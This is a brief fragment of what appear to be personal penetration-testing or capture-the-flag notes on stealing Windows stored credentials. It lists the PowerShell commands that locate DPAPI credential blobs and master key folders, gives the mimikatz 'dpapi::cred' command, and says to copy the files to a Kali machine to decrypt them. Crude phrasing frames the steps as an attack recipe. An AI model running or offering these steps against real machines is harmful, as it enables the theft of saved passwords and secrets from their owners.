...
if there is something go fuck it up

`gci -Force C:\users\<USERHERE>\appdata\local\microsoft\credentials\`

Hunt for the masterkey manually or automatically using mimiaktz and then using `dpapi::cred /in:<credential blob full path>`

` gci -Force C:\users\Administrator\appdata\roaming\microsoft\protect\<SID>\`

then it should be in there, then transfer the files as you wish over to your kali machine and decrypt it
...
Now with the master key decrypted your life SHOULD be easy
